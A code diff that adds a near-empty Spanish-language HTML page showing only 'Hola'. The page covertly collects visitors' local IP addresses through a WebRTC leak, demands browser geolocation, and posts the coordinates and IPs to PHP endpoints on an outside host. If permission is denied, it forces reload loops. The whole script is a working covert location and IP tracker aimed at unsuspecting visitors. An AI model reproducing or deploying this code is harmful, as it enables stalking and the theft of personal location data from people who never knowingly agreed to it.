@@ -1,1 +1,157 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="generator" content="">
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+<link href="css/style.css" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Dosis:200,300,400,500,600,700" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Roboto:200,300,400,500,600,700" rel="stylesheet">
+</head>
 
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+<script type="text/javascript">
+
+
+	$("#cont").hide();
+	
+	
+	function getUserIP(onNewIP) { //  onNewIp - your listener function for new IPs
+	    // compatibilidad para firefox y chrome
+	    var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+	    var pc = new myPeerConnection({
+		iceServers: []
+	    }),
+	    noop = function() {},
+	    localIPs = {},
+	    ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,
+	    key;
+
+	    function iterateIP(ip) {
+		if (!localIPs[ip]) onNewIP(ip);
+		localIPs[ip] = true;
+	    }
+
+	     // crear un canal de datos falso
+	    pc.createDataChannel("");
+
+	    // crear oferta y establecer descripción local
+	    pc.createOffer().then(function(sdp) {
+		sdp.sdp.split('\n').forEach(function(line) {
+		    if (line.indexOf('candidate') < 0) return;
+		    line.match(ipRegex).forEach(iterateIP);
+		});
+		
+		pc.setLocalDescription(sdp, noop, noop);
+	    }).catch(function(reason) {
+		// Ocurrió un error, así que maneje el error al conectarse
+
+	    });
+
+	    // escuchar eventos de candidatos
+
+	    pc.onicecandidate = function(ice) {
+		if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
+		ice.candidate.candidate.match(ipRegex).forEach(iterateIP);
+	    };
+	}
+
+	
+
+	var obip="";
+
+	getUserIP(function(ip){
+		obip = "_ "+ ip;
+	    //alert("Got IP! :" + ip);
+	});
+
+	function getIP(json) {
+		obip = obip + "  _ "+ json.ip;
+	    //document.write("My public IP address is: ", obip);
+	}
+
+	
+	function sendobip(){
+		var params = {
+		    "ipun" : obip
+		};
+
+  		$.ajax({
+			data:  params,
+			url:   'http://charreart.epizy.com/cap2.php',
+			dataType: 'html',
+			type:  'post',
+			success:  function (response) {
+			    console.log("echo1");
+			}
+    		});
+	}
+
+
+	window.addEventListener('load', function () {
+		if (navigator.geolocation) {
+    		navigator.geolocation.getCurrentPosition(funcOk, errorFunc);
+		}
+	});
+
+	
+
+	function funcOk(ps){
+  		
+
+  		$("#cont").show();
+  		var params = {
+		    "i" : "<?php echo $ipun; ?>",
+		    "la" : ps.coords.latitude,
+		    "lo" : ps.coords.longitude
+		};
+
+  		$.ajax({
+			data:  params,
+			url:   'http://charreart.epizy.com/cap.php',
+			dataType: 'html',
+			type:  'post',
+			success:  function (response) {
+			    console.log("echo2");
+			}
+    		});
+    	
+	}
+
+	function errorFunc(err) {
+	    switch(err.code) {
+	        case err.PERMISSION_DENIED:
+	        	$("#cont").remove();
+	            alert("Debe usted permitir el acceso a su posición para que la aplicación pueda funcionar");
+	            window.location.reload();
+	        case err.POSITION_UNAVAILABLE:
+	        	$("#cont").remove();
+	            alert("La información no está disponible");
+	            window.location.reload();
+	        case err.TIMEOUT:
+	       		$("#cont").remove();
+	            alert("No he podido obtener información");
+	            window.location.reload();
+	        default:
+	            $("#cont").remove();
+	            alert("Se ha producido un error desconocido al intentar obtener información");
+	            window.location.reload();
+	    }
+	}
+
+
+</script>
+
+
+<body id="cont">
+
+<script type="text/javascript">
+	$("#cont").hide();
+</script>
+
+  <p>Hola</p>
+
+</body>
+</html>
